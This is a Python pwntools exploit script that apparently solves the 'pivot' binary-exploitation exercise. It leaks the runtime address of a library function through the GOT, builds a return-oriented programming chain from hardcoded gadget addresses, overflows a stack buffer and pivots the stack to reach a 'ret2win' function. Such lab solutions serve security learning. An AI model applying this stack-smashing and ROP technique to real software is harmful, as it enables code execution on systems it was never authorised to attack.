from pwn import *

# goal: call ret2win
# before doing that we have to let the dynamic loader resolve
# the address of foothold function. Then we can read that address 
# and understand where the library is loaded. After that, we can 
# directly call ret2win. SInce the space isn't enough, we have to
# pivot the stack else where when we smash the stack!   

def skip_header(p):
    p.recvuntil(b"libpivot\n")

lib = ELF("./libpivot.so", checksec=False)
ret2win_offset = lib.symbols["ret2win"]
foothold_function_offset = lib.symbols["foothold_function"]

elf = ELF("./pivot", checksec=False)
foothold_function_got = elf.got["foothold_function"]
foothold_function_plt = elf.plt["foothold_function"]

pop_rax = 0x4009bb
xchg_rax_rsp = 0x4009bd
mov = 0x4009c0 # mov (%rax), %rax (att syntax)
jmp = 0x00000000004007c1 #: jmp rax; 
pop_rbp = 0x00000000004007c8 #: pop rbp; ret; 
add = 0x00000000004009c4 #: add rax, rbp; ret; 

p = process("./pivot")
skip_header(p)
line = p.recvline()
line = line.split(b"0x")
line = line[1][:-1]
new_stack_addr = int(line, 16)

payload = p64(foothold_function_plt)
payload += p64(pop_rax)
payload += p64(foothold_function_got)
payload += p64(mov)
payload += p64(pop_rbp)
payload += p64(ret2win_offset - foothold_function_offset)
payload += p64(add)
payload += p64(jmp)

p.sendline(payload)

offset = 0x20 + 8

stack_smash = b"A" * offset
stack_smash += p64(pop_rax)
stack_smash += p64(new_stack_addr)
stack_smash += p64(xchg_rax_rsp)

p.sendline(stack_smash)

print(p.recvall().decode())



